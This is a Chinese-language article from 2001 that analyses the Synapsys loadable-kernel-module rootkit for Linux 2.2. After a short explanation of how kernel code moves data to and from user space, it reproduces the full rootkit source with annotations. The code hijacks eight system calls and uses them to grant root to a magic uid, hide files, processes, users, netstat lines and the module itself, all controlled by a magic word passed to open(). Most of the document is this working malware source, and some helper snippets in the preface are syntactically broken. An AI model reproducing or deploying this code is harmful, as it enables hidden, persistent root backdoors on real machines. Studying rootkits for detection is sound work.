---
title: "对synapsys.c这个lkm的rootkit的代码分析"
date: 2001-03-29T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-143"
---

(quack_at_xfocus.org)

对synapsys.c这个lkm的rootkit的代码分析

by 大鹰<e4gle@hackermail.com>


前言

----------

    这个rootkit应该都不陌生，功能相对很强大，也是lkm实现的rootkit的典型，通过对他代码的实际分析可以看出利用linux的lkm我们可以做很多很多有趣的木马程序。

    就象Berserker本人对这个rootkit的解释一样，它截获open,getuid,kill,fork,clone,write,

query_module,getdents等系统调用，来实现针对特殊uid的root权限授予，隐藏自身文件，隐藏进程及其子进程和派生进程，隐藏netstat,finger,who等命令的输出，隐藏modules，呵呵。

    本文要求你最好具有基本的lkm内核编程知识，截获系统调用我不多说了，至于怎么从用户区来获得参数，以及如何在内核空间为用户区分配内存的问题，我这里简单介绍一下，因为它是lkm可以作为hacking kernel的关键。


我们如何从用户区取得参数

--------------------------

在《linux可装载内核完全指南》这篇文章中定义了几个实现方法，我这里重复一下，我自己也介绍一种可行的方法。

好，我们来看看这个函数的定义：

char *strncpy_fromfs(char *dest,const char *src,int n)

{

     char *tmp=src;

     int compt=0;


     while((dest[compt-1]!='\0')&&(compt!=n));

     do {

     dest[compt++]=_get_user(tmp++,1);

     }


     return dest;

}

这是一个经典例程，函数返回用户区的字符串指针，关键是我们利用了get_user(...)这个核心函数，它的作用可以用来将数据从用户态移到内核空间，同样道理我们可以用mencpy_fromfs(char *dest,const char *src,int n)来移动数据。


好，再给出第二个方法，copy_from_user(...)，很简单，函数返回用户区数据指针，我们看一下核心代码给出的函数原型：

static inline unsigned long

__generic_copy_from_user_nocheck(void *to, const void *from, unsigned long n)

{

    __copy_user_zeroing(to,from,n);

    return n;

}

这种也就是synapsys.c里面用的方法。


我们如何在内核空间为用户函数分配内存空间

--------------------------------------------

这个问题我解释一下，还是相对于上面来说，我们依然用这个函数：mencpy_tofs(void *to,const void *from,unsigned long count);但是我们如何在内核分配内存给*to呢？我们通过brk调用于current->mm->brk来增加未使用的数据段大小。我们给current进程分配内存空间，用来拷贝内核空间到用户模式。需要用到的brk调用就需要我们自己构建了，很简单，参看核心代码：

#define _syscall1(type,name,type1,arg1) \

type name(type1 arg1) \

{ \

long __res; \

__asm__ volatile ("int $0x80" \

    : "=a" (__res) \

    : "0" (__NR_##name),"b" ((long)(arg1))); \

if (__res >= 0) \

    return (type) __res; \

errno = -__res; \

return -1; \

}

另外一种方法就是利用get_ds来获取用户数据段寄存器，然后把内核用来指向用户段的段选器设成需要的ds值就可以了，我们用set_fs(get_ds)来做到，具体这两个调用的实现参看核心代码。


第三种方式就是synapsys.c中所用到的利用copy_to_user(...),前面已有所介绍，就不多说了。


分析synapsys.c源代码

-------------------------

/*********************************************************************************************************************

 *  Synapsys-lkm version 0.4

 *

 * coded by Berserker for Neural Collapse Crew  [[www.neural-collapse.org]](http://www.neural-collapse.org])

 *

 *  for questions, suggestions, bug report ---->  berserker.ncl@infinito.it             

 *

 * 描述 : Synapsys 是一个针对linux内核版本为2.2.x的lkm的rootkit. 实现文件和目录的隐藏 , 进程隐藏 

 * (包括子进程和派生进程), 隐藏netstat输出 (定义 port和host/ip/port/protocol变量), 以root特权来

 * 定义uid, 用户隐藏(finger/who/w), 模块本身的隐藏. 加载模块之后，你可以完全控制open()系统调用；

 * 可以任意激活/卸载, 可以改变隐藏文件的前缀, 在netstat输出里面屏蔽行信息以及隐藏用户列表。

 * 

 * 

 *  Saluti e Ringraziamenti : norby , anyone, beholder, mandarine, asfalto, jerusalem  

 *

 * 编译方法: gcc -c -O3 -fomit-frame-pointer Synapsys.c

 *

 *********************************************************************************************************************/

#define MODULE

#define __KERNEL__


#if CONFIG_MODVERSIONS==1

#define MODVERSIONS

#include <linux/modversions.h>

#endif 


#include <linux/module.h>

#include <linux/mm.h>

#include <linux/kernel.h>

#include <linux/fs.h>

#include <linux/dirent.h>

#include <linux/proc_fs.h>

#include <linux/stat.h>

#include <linux/fcntl.h>

#include <linux/if.h>

#include <linux/smp_lock.h>

#include <sys/syscall.h>

#include <asm/uaccess.h>

#include <asm/unistd.h>

#include <asm/segment.h>

#include <malloc.h>


char *magicword         = "traboz";               /* 通过open调用来控制lkm的关键字 */

char file2hide[20]      = "NCL_ph1l3";            /* 要隐藏的文件名包含的关键字 */

char hiddenuser[20]     = "Ncl";                  /* 在finger/who/w等命令的输出里隐藏的user值 */

char netstatstuff[20]   = "host_or_ip_or_port";   /* 要隐藏的netstat命令的输出行 */


#define HIDDEN_PORT "3012"         /* 定义端口号为*3012* */

#define PF_INVISIBLE 0x00002000

#define SIGNAL_INVISIBLE 32        /* 定义为隐藏进程发送的信号量 */

#define MAGIC_UID 666              /*定义MAGIC_UID值*/

#define LKM_NAME "Synapsys"        /*定义lkm程序的程序名，不多说了：）*/

#define M_UID_FUNC     "muid"     /* 定义为MAGIC_UID激活/卸载root特权的开关字（不知道这样解释是否理解，西西）*/

#define GETDENTS_FUNC  "hidf"     /* 定义激活/卸载隐藏文件及进程的开关字 */

#define UNINST_LKM     "unin"     /* 卸载moudle*/

#define NETSTAT_FUNC   "hidn"     /* 定义激活/卸除netstat命令输出的开关字 */

#define FINGER_FUNC    "hidu"     /* 定义激活/卸除用户信息的开关字 */

#define HIDELKM_FUNC   "hidm"     /* 定义激活/卸除lkm本身隐藏的开关字 */

#define BE_VERBOSE_CMD "verbose"  /*捕捉每个关键的变量值*/


int uid_func  = 1;             /* 1代表激活状态，0代表非激活（卸除）状态，缺省是全部激活状态*/

int hidf_func = 1;

int nets_func = 1;

int hidu_func = 1;

int hidm_func = 1;


extern void* sys_call_table[];/*导出系统调用表*/


asmlinkage int (*real_open)(const char *, int  ,int );/*定义open调用*/

asmlinkage int (*real_getuid)();     /*定义getuid调用*/

asmlinkage int (*real_getdents)(unsigned int, struct dirent *,unsigned int);/*定义getdents调用*/

asmlinkage int (*real_kill)(int, int);  /*定义kill调用*/

asmlinkage int (*real_fork)(struct pt_regs);/*定义fork调用*/

asmlinkage int (*real_clone)(struct pt_regs);

asmlinkage int (*real_write)(unsigned int , char *, unsigned int);

asmlinkage int (*real_query_module)(const char *, int, char *, size_t, size_t *);


asmlinkage void cleanup_module(void);

/*我们要替换的open调用*/

asmlinkage int hack_open(const char *pathname, int flag, int mod) {

/*这个asmlinkage定义，我费了很大的心思理解，后来在核心代码的socket.c中找到了，是一个内联函数，

主要是gcc在编译的时候连接asm代码*/

  char *k_pathname;

  char *x,*cmd,*tmp,*arg;

  int i = 0;

  k_pathname = (char*) kmalloc(256, GFP_KERNEL);


  copy_from_user(k_pathname, pathname, 255);/*从用户区得到pathname值到内核空间*/

  x = strstr(k_pathname, magicword);    /*检查pathname里面有没有我们想要隐藏的东东*/

  if ( x ) {

    tmp = &x[strlen(magicword)];

    if (strlen(tmp) >= 4) {

      if (strlen(tmp) > 4)

      arg = &tmp[4];

      else arg = 0;

      cmd = strncpy(cmd, tmp, 4);

      cmd[4] = '\0';

      if (strcmp(cmd,M_UID_FUNC) == 0) {       

    if (arg == 0) {

          if (uid_func == 1) uid_func--;

          else uid_func++;

    }  

    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD) == 0)      

      printk("the value of uid_func is : %d\n",uid_func);

      }

      else if (strcmp(cmd,GETDENTS_FUNC) == 0) {        /*确定隐藏文件本身的目录列表显示*/

        if (arg == 0) {

          if (hidf_func) hidf_func--;

          else hidf_func++;

    }

    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD) == 0)

      printk("the value of hidf_func is : %d the hidden files prefix is : %s\n  ",hidf_func,file2hide);

    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD)) {

      memset(file2hide,0,sizeof(file2hide));

      strncpy(file2hide,arg,strlen(arg));

    }

      }

      else if (strcmp(cmd,NETSTAT_FUNC) == 0) {   /*确定隐藏netstat的输出行*/

    if (arg == 0) {

          if (nets_func == 1) nets_func--;

          else nets_func++;

    }

    else if(strcmp(arg,BE_VERBOSE_CMD) == 0) {

      printk("the value of nets_func is : %d the hidden port is: %s are hidden lines that contains %s too\n"

         ,nets_func, HIDDEN_PORT, netstatstuff );

    }

    else if (strcmp(arg,BE_VERBOSE_CMD) != 0) {

      memset(netstatstuff,0,sizeof(netstatstuff));

      strncpy(netstatstuff,arg,strlen(arg));

    }

      }

      else if(strcmp(cmd,FINGER_FUNC) == 0) {  /*确定隐藏finger输出*/

    if (arg == 0) {

          if (hidu_func == 1) hidu_func--;

          else hidu_func++;

        }

    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD) == 0)

      printk("the value of hidu_func is : %d the hidden user is %s\n", hidu_func, hiddenuser);

    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD)) {

      memset(hiddenuser,0,sizeof(hiddenuser));

      strncpy(hiddenuser,arg,strlen(arg));

    }

      }

      else if(strcmp(cmd,HIDELKM_FUNC) == 0) {   /*确定隐藏自身模块*/

    if (arg == 0) {

      if (hidm_func == 1) hidm_func--;

      else hidm_func++;

    }

    else if (arg != 0&& strcmp(arg,BE_VERBOSE_CMD) == 0)

      printk("the value of hidm_func is : %d the module name hidden is : %s\n",hidm_func, LKM_NAME);

      }


      else if (!strcmp(cmd,UNINST_LKM)) {

    printk("unistalling %s\n",LKM_NAME);

    cleanup_module();

      }

      

    }

    kfree(k_pathname);                         /*释放内核内存空间*/

    return (real_open(pathname, flag, mod));

  }


  else {

    kfree(k_pathname);

    return(real_open(pathname, flag, mod));

  }

}

/*开始截获调用！*/

asmlinkage int hack_getuid() {    /*截获getuid调用*/

  int a;


    if(uid_func == 1 && current->uid == MAGIC_UID ) {


      current->uid = 0;

      current->euid = 0;

      current->gid = 0;

      current->egid = 0;

      return 0;


    }

/*解释一下，怎么来截获呢？我大概讲一下，主要大家还是要看一下lkm的实现原理，

接获这个调用的意思是：当指向当前进程的指针current->uid为我们前面所确定的

MAGIC_UID的值的时候，也就是我们以这个MAGIC_UID登陆系统的是后，使当前进程的

uid,euid,gid,egid都为0，应该知道这意味这什么吧？西西*/

    a = real_getuid();

    return a;             /*用回真实的getuid调用*/


}

asmlinkage int my_atoi (char *str) {

  int ret = 0;

  int i;

  for(i = 0; str[i] >='0' && str[i] <='9'; ++i)

    ret = 10 * ret + str[i] - '0';

  return ret;

}

/*该隐藏我们进程的任务列表结构啦*/

asmlinkage inline char *task_name(struct task_struct *p, char *buf) {

  int i;

  char *name;

  name = p->comm;

  i=sizeof(p->comm);

  do {

    unsigned char c = *name;

    name++;

    i--;

    *buf = c;

    if (!c)

      break;

    if (c == '\\') {

      buf[1] = c;

      buf += 2;

      continue;

    }

    if (c == '\n') {

      buf[0] = '\\';

      buf[1] = 'n';

      buf += 2;

      continue;

    }

    buf++;

  }

  while(i);

  *buf = '\n';

  return buf + 1;

}

/*取得pid*/

 struct task_struct *get_task(pid_t pid) {

  struct task_struct *p = current;

  do { 

    if (p->pid == pid) return p;

    p = p->next_task;

  }

  while (p != current);

  return NULL;

}

/*隐藏pid！*/

asmlinkage int is_invisible(pid_t pid) {


  struct task_struct *task = get_task(pid);

  if (task == NULL) return 0;

  if (task->flags & PF_INVISIBLE) return 1; 

  return 0;

}

/*截获kill调用，当调用kill来发信号给我们uid或euid时，就返回一个没有该进程的信息*/

asmlinkage int hack_kill(pid_t pid, int sig) {


 struct task_struct *task = get_task(pid); 


 if(task  == NULL)

   return(-ESRCH);


 else if(current->uid && current->euid)

   return(-EPERM);


 

 else if (sig == SIGNAL_INVISIBLE) {

    task->flags |= PF_INVISIBLE;

  }

 else { 

    return (*real_kill)(pid, sig);

 }


}

/*截获fork调用，隐藏派生的子进程*/

asmlinkage int hack_fork(struct pt_regs regs) {


  struct task_struct *task;

  pid_t pid;

  int h = 0;


  pid = real_fork(regs);

  task = get_task(pid);


  if (is_invisible(current->pid))

    h++;

  if (h && pid >= 0) {


    if (task == NULL)

      return -ESRCH;

    if (pid <= 1)

      return -1;


    task->flags |= PF_INVISIBLE;

  }

  return pid ;

}


asmlinkage int hack_clone(struct pt_regs regs) {


  struct task_struct *task;

  pid_t pid;

  int h = 0;


  pid = real_clone(regs);

  task = get_task(pid);


  if (is_invisible(current->pid))

    h++;

  if (h && pid >= 0) {


    if (task == NULL)

      return -ESRCH;

    if (pid <= 1)

      return -1;


    task->flags |= PF_INVISIBLE;

  }

  return pid ;

}

/*呵呵，开始隐藏我们的文件，接获getdents调用。这个截获很基础，就不多做注释了*/

asmlinkage int hack_getdents( unsigned int fd, struct dirent *dirp, unsigned int count) {


  unsigned int getdret,n;

  int x , proc = 0;

  struct inode *dinode;

  struct dirent *dirp2, *dirp3; 

  char *hiddenfile = file2hide;  /*定义我们要隐藏的文件名*/


  getdret = (*real_getdents)(fd,dirp,count);

 /*定义目录节点*/

#ifdef __LINUX_DCACHE_H

  dinode = current->files->fd[fd]->f_dentry->d_inode;

#else

  dinode = current->files->fd[fd]->f_inode;

#endif


   if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) &&

       MINOR(dinode->i_dev) == 1) proc++;


   if (getdret > 0 ) {


     dirp2 = (struct dirent *) kmalloc(getdret, GFP_KERNEL);

     copy_from_user(dirp2, dirp, getdret);/*获取用户区参数*/

     dirp3 = dirp2;

     x = getdret ;


     while (x > 0) {


       n = dirp3->d_reclen;

       x -= n;


       if (((strstr ((dirp3->d_name), hiddenfile) != NULL ||

         (proc && is_invisible(my_atoi(dirp3->d_name))))  && hidf_func )) {


     if (x != 0) 

       memmove (dirp3, (char *) dirp3 + dirp3->d_reclen, x);

         else 

        dirp3->d_off = 1024;

         getdret -= n;

       }

       if(dirp3->d_reclen == 0) {

     getdret -= x;

     x = 0;

       }

       if ( x != 0) 

     dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);

     }

     copy_to_user(dirp, dirp2, getdret);

     kfree(dirp2);

   }

   return getdret;

}

/*截获write调用*/

asmlinkage int hack_write(unsigned int fd, char *buf,unsigned int count) {


  char *k_buf;

  char *user = hiddenuser;

  char *whtvr = netstatstuff;

  

  

  if (strcmp(current->comm,"netstat" ) != 0 && strcmp(current->comm, "finger") != 0 && strcmp(current->comm, "w") != 0 && strcmp(current->comm, "who") ) 

    return real_write(fd, buf, count);

  


 

  if ((strcmp(current->comm, "netstat") == 0) && nets_func) {

    k_buf = (char *) kmalloc(2000, GFP_KERNEL);

    memset(k_buf,0,2000);

    copy_from_user (k_buf, buf, 1999);

    if (strstr(k_buf,HIDDEN_PORT) || strstr(k_buf,whtvr) ) {/*检查是否是有我们要隐藏的netstat行*/

      kfree(k_buf);

      return count;

    }

    kfree(k_buf);

  } 


  if ((strcmp(current->comm, "finger") == 0 || strcmp(current->comm, "w") || strcmp(current->comm, "who")) && hidu_func) {

    k_buf = (char *) kmalloc(2000, GFP_KERNEL);/*在内核分配内存空间*/

    memset(k_buf,0,2000);

    copy_from_user (k_buf, buf, 1999); /*从用户区获得参数*/

    if (strstr(k_buf,user)) {  /*从finger输出找出我们的用户标示*/      

      kfree(k_buf);

      return count;

    }

    kfree(k_buf);

  }

  return real_write(fd, buf,count);


}

/*截获query_module调用来隐藏模块自身*/

asmlinkage int hack_query_module(const char *name, int which, char *buf, size_t bufsize, size_t *ret) {


  int r, a;

  char *ptr, *match;


  r = real_query_module(name, which, buf, bufsize, ret);


  if (r == -1)

    return -ENOENT;

  if (which != QM_MODULES)

    return r;


  ptr = buf;


  for (a = 0; a < *ret; a++) {

    if (!strcmp(LKM_NAME, ptr) && hidm_func) {

      match = ptr;

      while (*ptr)

    ptr++;

      ptr++;

      memcpy(match, ptr, bufsize -(ptr -(char *)buf));

      (*ret)--;

      return r;

    }

    while (*ptr)

      ptr++;

    ptr++;

  }

  return r;

}


/*开始加载我们的内核模块！*/

int init_module(void){


  real_open=sys_call_table[SYS_open];/*保存原open调用*/

  sys_call_table[SYS_open]=hack_open;/*截获！*/


  real_getuid=sys_call_table[SYS_getuid];/*保存原getuid调用*/

  sys_call_table[SYS_getuid]=hack_getuid;/*截获*/


  real_getdents=sys_call_table[SYS_getdents];/*保存原getdents调用*/

  sys_call_table[SYS_getdents]=hack_getdents;/*截获！*/


  real_kill=sys_call_table[SYS_kill];/*保存原kill调用*/

  sys_call_table[SYS_kill]=hack_kill;/*截获！*/


  real_fork=sys_call_table[SYS_fork];/*保存原fork调用*/

  sys_call_table[SYS_fork]=hack_fork;/*截获！*/


  real_clone=sys_call_table[SYS_clone];/*保存原clone调用*/

  sys_call_table[SYS_clone]=hack_clone;/*截获*/


  real_write=sys_call_table[SYS_write];/*保存write调用*/

  sys_call_table[SYS_write]=hack_write;/*截获*/


  real_query_module=sys_call_table[SYS_query_module];/*保存原query_module调用*/

  sys_call_table[SYS_query_module]=hack_query_module;/*截获*/


  return 0;  


}

void cleanup_module(void){                    /*卸载*/


  sys_call_table[SYS_open]=real_open;

  sys_call_table[SYS_getuid]=real_getuid;

  sys_call_table[SYS_getdents]=real_getdents;

  sys_call_table[SYS_kill]=real_kill;

  sys_call_table[SYS_fork]=real_fork;

  sys_call_table[SYS_clone]=real_clone;

  sys_call_table[SYS_write]=real_write;

  sys_call_table[SYS_query_module]=real_query_module;


}
